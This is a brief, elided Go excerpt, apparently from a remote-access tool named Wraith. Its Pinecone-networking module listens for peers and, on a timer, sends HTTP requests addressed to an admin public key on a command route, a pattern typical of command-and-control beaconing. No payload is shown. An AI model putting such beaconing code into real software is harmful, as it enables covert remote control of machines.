...
func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
	...
	pr.PineconeIdentity = m.OwnPrivKey
	pr.InboundAddr = m.ListenTcp
	pr.WebserverAddr = m.ListenWs
	pr.UseMulticast = m.UseMulticast
	pr.StaticPeers = m.StaticPeers
	...
	pMux.Path(proto.ROUTE_PREFIX + proto.ROUTE_CMD).HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		...
		for {
			...
			case <-time.After(time.Duration(interval) * time.Second):
				...
				req := http.Request{
					...
					URL: &url.URL{
						Scheme: "http",
						Host:   hex.EncodeToString(m.AdminPubKey),
